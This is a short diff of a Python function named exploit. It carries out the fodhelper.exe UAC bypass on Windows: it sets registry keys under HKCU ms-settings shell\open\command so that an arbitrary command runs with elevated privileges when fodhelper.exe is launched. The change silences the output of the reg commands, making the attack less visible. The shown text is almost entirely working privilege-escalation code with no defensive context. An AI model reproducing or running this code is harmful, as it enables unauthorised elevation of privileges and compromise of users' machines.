@@ -121,8 +121,8 @@ def exploit(command_to_execute):
     windir = os.getenv('windir')
     run_fodhelper = windir+"\\System32\\fodhelper.exe"
     
-    subprocess.run("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f")
-    subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d "'+command_to_execute+'" /f')
+    subprocess.run("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d "'+command_to_execute+'" /f', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     os.system(run_fodhelper)
 
